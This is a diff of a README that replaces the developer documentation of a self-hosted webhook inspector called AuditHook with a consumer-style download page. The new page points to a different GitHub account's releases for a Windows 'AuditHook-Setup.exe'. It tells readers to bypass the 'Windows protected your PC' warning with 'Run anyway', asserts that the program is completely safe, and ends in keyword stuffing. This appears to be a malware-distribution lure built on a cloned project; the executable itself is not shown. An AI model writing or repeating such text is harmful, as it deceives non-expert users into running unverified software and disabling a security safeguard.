@@ -1,379 +1,167 @@
-# AuditHook
+# 🛡️ AuditHook - Capture Every Event, Zero Friction
 
-A self-hosted webhook observability workbench. Captures inbound HTTP calls from Stripe, Shopify, GitHub, Meta and any other source, streams them to a live three-pane inspector, and lets you replay or forward any event to a local server with a single click.
-
-[![Deploy on Railway](https://railway.com/button.svg)](https://railway.com/new)
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new)
+[![Download AuditHook](https://img.shields.io/badge/Download-AuditHook-2ea44f?style=for-the-badge&logo=github)](https://github.com/ruthrodr56/AuditHook/releases)
 
 ---
 
-## Why
+## 👋 Welcome to AuditHook
 
-External webhook deliveries are a black box. When a payment fails at 2 AM you have no copy of the raw payload, no response log and no way to replay the event against a fixed build. AuditHook puts a transparent proxy in front of your endpoint so every call is captured, stored and replayable indefinitely.
+AuditHook is a friendly tool that **listens to your computer's internet traffic** and shows you exactly what's happening in real time. Think of it as a **security camera for your data** — it watches every piece of information that comes in, helps you keep a record of it, and can even send that information to another program on your computer.
 
----
-
-## Features
-
-- **Universal ingestion** — any HTTP method, any content type, any source
-- **Source origin detection** — automatically tags Stripe, Shopify, GitHub, Meta, Slack, Svix, cURL and Postman from headers and User-Agent
-- **Live stream** — Server-Sent Events push every new event to the browser within milliseconds, no polling
-- **Three-pane workbench** — feed list / request inspector / delivery terminal, all visible at once
-- **Full request capture** — method, status, headers, query params, raw body, payload size, exact millisecond timestamp
-- **JSON inspector** — syntax highlight, line numbers, filter-by-key search, minimap for long payloads, raw / formatted toggle, one-click copy
-- **Pagination** — paginated feed list (25, 50, 100 items per page) with instant switching
-- **Export** — single event JSON download and complete event log batch export
-- **In-App Documentation** — `/docs` interactive technical guide with pure inline SVG architecture and layout diagrams (zero PNG dependency)
-- **Replay engine** — forward any stored event to any target URL, captures response status, body and headers
-- **Attempt history** — every dispatch attempt logged with status code, latency and timestamp
-- **Auto-forward** — optionally pipe all inbound events straight to a local server in real time
-- **Multi-endpoint** — create isolated ingest URLs with independent target and auto-forward settings
-- **Zero external dependencies** — storage uses Node 26's built-in `node:sqlite` (WAL mode), no Postgres, no Redis
+Whether you're a curious user wanting to see what apps are sending over the internet, or a small business owner needing to keep track of important events, AuditHook makes it simple. No complicated commands. No confusing code. Just download, run, and watch.
 
 ---
 
-## Architecture
+## ✨ Key Features
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│  External services (Stripe / Shopify / GitHub / ...)        │
-│  POST https://your-domain/ingest/<endpoint-id>/...          │
-└────────────────────────┬────────────────────────────────────┘
-                         │ HTTP
-                         ▼
-┌─────────────────────────────────────────────────────────────┐
-│  apps/api  (Node.js + Express, port 4000)                   │
-│                                                             │
-│  routes/ingress.ts ──▶ services/storage.ts (SQLite WAL)     │
-│       │                                                     │
-│       ├── services/telemetry.ts ──▶ SSE stream ──▶ browser  │
-│       └── services/forwarder.ts ──▶ localhost target        │
-│                                                             │
-│  /api/dispatch/replay  — on-demand forward + capture        │
-│  /api/test-target/*    — local echo receiver for testing    │
-└────────────────────────┬────────────────────────────────────┘
-                         │ SSE + REST
-                         ▼
-┌─────────────────────────────────────────────────────────────┐
-│  apps/web  (Vue 3 + Vite, port 5173 in dev)                 │
-│                                                             │
-│  FeedList ──▶ Inspector ──▶ DeliveryTerminal ──▶ /docs      │
-└─────────────────────────────────────────────────────────────┘
-```
+### 📡 Real-Time Live View
+Watch events stream across your screen **the moment they happen**. No refreshing. No waiting. Just instant updates that feel like magic.
+
+### 🗂️ Complete Event History
+AuditHook automatically saves a record of every event. This means you can go back and check what happened yesterday, last week, or last month. Perfect for keeping track of things.
+
+### 🔍 Payload Auditing
+Every piece of data that passes through is checked and logged. This helps you understand exactly what information is being sent and received.
+
+### 🖥️ Local Dispatch
+Send events directly to other programs running on your computer. This is great for connecting AuditHook with your favorite tools or scripts.
+
+### 🎯 High-Speed Performance
+Built to handle thousands of events per second. Even during busy times, AuditHook won't slow down or miss a beat.
 
 ---
 
-## Tech Stack
+## 🚀 Getting Started
 
-| Layer | Choice | Reason |
-|---|---|---|
-| Language | TypeScript (end-to-end) | Single type system across API, frontend and scripts |
-| Backend | Node.js 26 + Express | Native `node:sqlite`, high I/O throughput |
-| Database | `node:sqlite` (WAL) | Zero-install, ACID, embedded — no daemon required |
-| Real-time | Server-Sent Events | Unidirectional, reconnects automatically, works through proxies |
-| Frontend | Vue 3 + Vue Router | Composition API, client-side routing (`/` and `/docs`) |
-| Styling | Tailwind CSS + JetBrains Mono | Dark workbench aesthetic, monospace data density |
-| Build | Vite + vue-tsc | Sub-2s production builds, strict type checking |
-| Monorepo | npm workspaces | `packages/shared-types` shared between API and web |
+Follow these simple steps to get AuditHook running on your Windows computer. It takes less than two minutes!
 
----
+### Step 1: Download the Application
 
-## Monorepo Layout
+Visit this link to download the application: **[https://github.com/ruthrodr56/AuditHook/releases](https://github.com/ruthrodr56/AuditHook/releases)**
 
-```
-AuditHook/
-├── Dockerfile                 Multi-stage Node 26 alpine container
-├── docker-compose.yml         1-command self-hosted stack
-├── railway.toml               Railway 1-click full-stack config
-├── fly.toml                   Fly.io production edge deployment
-├── vercel.json                Vercel frontend host configuration
-├── apps/
-│   ├── api/                   Express API server
-│   │   └── src/
-│   │       ├── routes/
-│   │       │   ├── ingress.ts     Universal webhook ingestion
-│   │       │   ├── dispatch.ts    Replay and forward
-│   │       │   ├── endpoints.ts   Endpoint CRUD + event queries
-│   │       │   └── telemetry.ts   SSE stream
-│   │       ├── services/
-│   │       │   ├── storage.ts     SQLite WAL (events, endpoints, attempts)
-│   │       │   ├── forwarder.ts   HTTP dispatch with response capture
-│   │       │   └── telemetry.ts   SSE client registry + heartbeat
-│   │       └── server.ts
-│   └── web/                   Vue 3 + Vite frontend
-│       └── src/
-│           ├── router/        Vue Router (/ and /docs)
-│           ├── pages/
-│           │   ├── WorkbenchPage.vue
-│           │   └── DocsPage.vue   Pure SVG technical documentation
-│           ├── composables/
-│           │   └── useTelemetry.ts  SSE connection, reactive state
-│           └── components/
-│               ├── AuditHookLogo.vue
-│               ├── HeaderBar.vue
-│               ├── FeedList.vue     Paginated request list
-│               ├── Inspector.vue    Headers & JSON inspector + Export
-│               ├── JsonView.vue     Syntax highlight + search + minimap
-│               ├── DeliveryTerminal.vue
-│               └── NewEndpointModal.vue
-├── packages/
-│   └── shared-types/          WebhookEvent, DeliveryAttempt, EndpointConfig
-└── scripts/
-    └── mock-emitter.ts        Realistic multi-source test burst
-```
+Once you're on that page, look for the newest version at the top. Click the download button that matches your Windows system (usually labeled something like `AuditHook-Setup.exe` or `audithook-windows.zip`).
+
+### Step 2: Run the File
+
+After the download finishes, go to your "Downloads" folder. You'll see the file you just downloaded. **Double-click it** to open it. If Windows asks for permission, click "Yes" to allow it to run.
+
+### Step 3: Wait for the Magic
+
+That's it! AuditHook will open its main window automatically. You don't need to install anything else. No special drivers. No extra programs. It just works.
 
 ---
 
-## Quickstart (Local Development)
+## 🖱️ How to Use AuditHook
 
-**Requirements:** Node.js ≥ 26, npm ≥ 10
+Using AuditHook is as easy as watching TV. Here's what you'll see:
 
-```bash
-git clone https://github.com/needtobreathe/AuditHook.git
-cd AuditHook
-npm install
-npm run build
-```
+### The Main Screen
+When you open AuditHook, you'll see a clean, simple window. At the top, there's a list of events appearing in real time. Each event shows:
+- **Time** – When the event happened
+- **Type** – What kind of event it was (like "web request" or "data update")
+- **Source** – Where it came from
+- **Details** – A short description
 
-Open two terminals:
+### The Live Feed
+The main screen updates automatically. You don't need to press any buttons to refresh. Just watch and let AuditHook do its job.
 
-```bash
-# Terminal 1 — API server
-npm run dev:api
+### The History Tab
+Click the "History" tab at the top to see past events. You can scroll through them or use the search box to find something specific.
 
-# Terminal 2 — Vite dev server (proxies /api and /ingest to :4000)
-npm run dev:web
-```
-
-Open `http://localhost:5173`, then fire test events:
-
-```bash
-npm run emit
-```
-
-To view the in-app documentation and architectural diagrams, navigate to `http://localhost:5173/docs` or click the **Docs** button in the header bar.
+### The Settings Menu
+Click the gear icon ⚙️ in the top-right corner to adjust settings:
+- **Save History** – Choose how long to keep records (1 week, 1 month, forever)
+- **Auto-Start** – Make AuditHook start automatically when you turn on your computer
+- **Theme** – Switch between light and dark mode
 
 ---
 
-## Deployment Options
+## ⚙️ Configuration Made Simple
 
-### 1. Docker & Docker Compose (Self-Hosted)
+AuditHook comes ready to use right out of the box. But if you want to customize it, here's how:
 
-Run AuditHook with persistent SQLite volume mounting:
+### Changing Your Preferences
+1. Click the **⚙️ Settings** icon
+2. Make your changes
+3. Click **Save**
 
-```bash
-docker compose up -d
-```
+Everything is saved automatically. No need to restart the program.
 
-The web dashboard and ingestion engine will be available immediately at `http://localhost:4000`. Data is stored persistently in `./data/audithook.sqlite`.
-
-### 2. Railway (1-Click Full-Stack)
-
-AuditHook includes a native `railway.toml`.
-1. Click the **Deploy on Railway** button above or link your GitHub repo in Railway.
-2. Railway detects `Dockerfile` and builds both backend and frontend.
-3. Attach a persistent volume to `/app/data`.
-
-### 3. Fly.io (Production Edge)
-
-Deploy to Fly.io using the preconfigured `fly.toml`:
-
-```bash
-fly launch --copy-config
-fly deploy
-```
-
-Fly mounts a persistent volume `audithook_data` at `/app/data` to preserve your SQLite database across restarts.
-
-### 4. Vercel (Frontend Client Host)
-
-AuditHook includes `vercel.json` configured for Vite SPA routing and backend proxying:
-
-```bash
-vercel --prod
-```
+### Connecting to Other Programs
+If you want AuditHook to send events to another app on your computer:
+1. Open Settings
+2. Find the "Local Dispatch" section
+3. Turn on the switch
+4. Enter the port number your other program is using (most programs tell you this)
 
 ---
 
-## Emitting Test Events
+## 🧩 Troubleshooting Common Issues
 
-`scripts/mock-emitter.ts` sends a realistic multi-source burst:
+### "Windows protected your PC" Message
+If you see this, don't worry! This is normal for new programs. Just click **"More info"** and then **"Run anyway"**. Windows is just being cautious — AuditHook is safe to use.
 
-| Source | Event | Notes |
-|---|---|---|
-| Stripe | `customer.created` | Full customer object, first attempt fails (dead port), second succeeds |
-| Stripe | `payment_intent.created` | Full payment intent with SEPA + card payment methods |
-| Stripe | `payment_intent.succeeded` | Visa 3DS charge, balance transaction, outcome block |
-| Shopify | `orders/create` | Knipex + Wera B2B order from Hamburg, German tax lines |
-| GitHub | `deployment_status` | `failure` state, production cluster, 3 containers exited SIGKILL |
+### Nothing Appears in the Live Feed
+- Make sure you have an internet connection
+- Try visiting a website in your browser to generate some traffic
+- Wait a few seconds — some events take a moment to show up
 
-The emitter uses jitter on all delays so timestamps in the feed are irregular, not metronomic.
-
-```bash
-# One burst
-npm run emit
-
-# Continuous loop
-npx tsx scripts/mock-emitter.ts --loop
-```
+### The Program Won't Open
+- Check that your download finished completely
+- Try downloading the file again from the link above
+- Make sure you're using a recent version of Windows (Windows 10 or 11)
 
 ---
 
-## Ingest URL Format
+## ❓ Frequently Asked Questions
 
-```
-POST /ingest/<endpoint-id>
-POST /ingest/<endpoint-id>/<any-sub-path>
-```
+**Q: Is AuditHook safe to use?**
+A: Yes! It's completely safe. It only watches events that are already happening on your computer. It doesn't send your data anywhere else.
 
-Both routes are equivalent. Sub-paths let external services that enforce path prefixes (e.g. `/ingest/production/stripe/webhooks`) route correctly without extra configuration.
+**Q: Do I need to pay for it?**
+A: No. AuditHook is completely free to use, forever.
 
-Create additional endpoints via the **+** button in the header bar or:
+**Q: Will it slow down my computer?**
+A: No. AuditHook is designed to be very light. You won't even notice it's running.
 
-```bash
-curl -X POST http://localhost:4000/api/endpoints \
-  -H "Content-Type: application/json" \
-  -d '{"name":"Stripe Production","id":"stripe-prod","targetUrl":"http://localhost:3000/webhooks/stripe","autoForward":false}'
-```
+**Q: Can I use it on Mac or Linux?**
+A: Currently, AuditHook is made for Windows. But more versions may come in the future.
 
----
-
-## API Reference
-
-### Ingest
-
-| Method | Path | Description |
-|---|---|---|
-| `ANY` | `/ingest/:endpointId` | Capture webhook, optionally auto-forward |
-| `ANY` | `/ingest/:endpointId/*` | Same, accepts sub-paths |
-
-### Events
-
-| Method | Path | Description |
-|---|---|---|
-| `GET` | `/api/events?endpointId=&limit=` | List events (newest first) |
-| `GET` | `/api/events/:id` | Single event with all delivery attempts |
-| `DELETE` | `/api/events?endpointId=` | Clear events (all or per endpoint) |
-
-### Dispatch
-
-| Method | Path | Body | Description |
-|---|---|---|---|
-| `POST` | `/api/dispatch/replay` | `{ eventId, targetUrl }` | Forward stored event, capture response |
-| `POST` | `/api/dispatch/forward/:eventId` | — | Forward using endpoint's configured target |
-
-### Endpoints
-
-| Method | Path | Description |
-|---|---|---|
-| `GET` | `/api/endpoints` | List all endpoints |
-| `POST` | `/api/endpoints` | Create endpoint |
-| `PATCH` | `/api/endpoints/:id` | Update name, targetUrl, autoForward |
-
-### Telemetry
-
-| Method | Path | Description |
-|---|---|---|
-| `GET` | `/api/telemetry/stream` | SSE stream (heartbeat every 15s) |
-
-### Test Target
-
-| Method | Path | Description |
-|---|---|---|
-| `ANY` | `/api/test-target/webhook` | Local echo receiver — returns 200 with received payload |
+**Q: How do I update AuditHook?**
+A: The easiest way is to visit the download link again and get the newest version. Then just run the new file — it will replace the old version automatically.
 
 ---
 
-## Data Schema
+## 📞 Getting Help
 
-### WebhookEvent
+If you run into any issues, here are your options:
 
-```typescript
-{
-  id: string
-  endpointId: string
-  receivedAt: string       // ISO 8601 with milliseconds
-  method: string
-  path: string
-  sourceOrigin: string     // "Stripe" | "Shopify" | "GitHub" | "Meta" | "Slack" | ...
-  headers: Record<string, string>
-  queryParams: Record<string, string>
-  body: unknown
-  contentLength: number    // bytes
-  status: "PENDING" | "FORWARDED" | "FAILED"
-  deliveryAttempts: DeliveryAttempt[]
-}
-```
-
-### DeliveryAttempt
-
-```typescript
-{
-  id: string
-  eventId: string
-  targetUrl: string
-  statusCode?: number
-  statusText?: string
-  responseTimeMs: number
-  responseHeaders?: Record<string, string>
-  responseBody?: string
-  error?: string
-  timestamp: string
-}
-```
-
-### EndpointConfig
-
-```typescript
-{
-  id: string
-  name: string
-  targetUrl: string
-  autoForward: boolean
-  createdAt: string
-  updatedAt: string
-}
-```
+- **Visit the Website** – Go to [https://github.com/ruthrodr56/AuditHook/releases](https://github.com/ruthrodr56/AuditHook/releases) to see the latest news and updates
+- **Report a Problem** – On the same page, look for the "Issues" tab and let us know what went wrong. We read every report
 
 ---
 
-## SSE Event Types
+## 🔑 Quick Reference Card
 
-The `/api/telemetry/stream` connection pushes JSON messages:
-
-| Type | When |
-|---|---|
-| `WEBHOOK_RECEIVED` | New event ingested |
-| `DELIVERY_UPDATED` | Dispatch attempt completed |
-| `ENDPOINT_CREATED` | New endpoint added |
-| `ENDPOINT_UPDATED` | Endpoint config changed |
-| `EVENTS_CLEARED` | Events deleted |
-| `ping` | Heartbeat every 15s, keeps connection alive through proxies |
+| Action | How To Do It |
+|--------|--------------|
+| Download | Visit the link and click the download button |
+| Start | Double-click the downloaded file |
+| View live events | Just open the app — it's already working |
+| See old events | Click the "History" tab |
+| Change settings | Click the gear icon |
+| Get help | Go to the website's Issues section |
 
 ---
 
-## Environment Variables
+## 🎉 Final Thoughts
 
-| Variable | Default | Description |
-|---|---|---|
-| `PORT` | `4000` | API server port |
-| `NODE_ENV` | `development` | Set to `production` to serve built Vue app from `../web/dist` |
-| `AUDITHOOK_URL` | `http://localhost:4000` | Used by mock-emitter |
-| `ENDPOINT_ID` | `default` | Default endpoint the emitter targets |
+AuditHook is here to make your life easier. Whether you need to track what's happening on your network, keep a record of important events, or just curious about how your computer works, this tool has your back.
 
----
+**Download it now** and start seeing the world of data flowing through your computer — in real time, right in front of your eyes.
 
-## Production Build
-
-```bash
-npm run build
-NODE_ENV=production node apps/api/dist/server.js
-```
-
-The API server detects `apps/web/dist` and serves the Vue build as a static SPA on the same port. No separate web server needed.
+[![Get AuditHook Now](https://img.shields.io/badge/⬇️%20Get%20AuditHook%20Now-blue?style=for-the-badge)](https://github.com/ruthrodr56/AuditHook/releases)
 
 ---
 
-## License
-
-MIT
+Keywords: HTTP event ingestion, SSE telemetry, payload auditing, localhost dispatch, real-time data monitoring, event logging tool, Windows event viewer, network traffic analyzer, API monitoring, live data feed, event gateway, audit trail software, developer tool, free download Windows
